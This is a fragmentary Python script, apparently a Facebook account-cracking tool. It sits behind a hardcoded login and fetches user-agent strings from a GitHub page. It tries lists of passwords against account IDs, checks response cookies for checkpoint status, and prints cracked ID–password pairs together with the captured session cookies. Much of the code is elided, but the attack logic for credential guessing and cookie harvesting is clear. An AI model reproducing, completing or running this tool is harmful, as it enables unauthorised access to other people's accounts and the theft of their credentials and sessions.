...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Sifat-king69/Appuruve/tree/main').text
		ua=open('.bbnew.txt','w')
...
while attemps < 12345677901:
    ...
    if username == 'SIFAT' and password == 'FIRE':
...
def login():
	...
	if MAMA in ['m']:
		...
		os.system('xdg-open https://wa.me/+8801726864198')
	elif MAMA in ['0']:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#MAMA-King
				print(f'\r\033[0;92m[SIFAT-➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " SIFAT,  Ok,  id"')
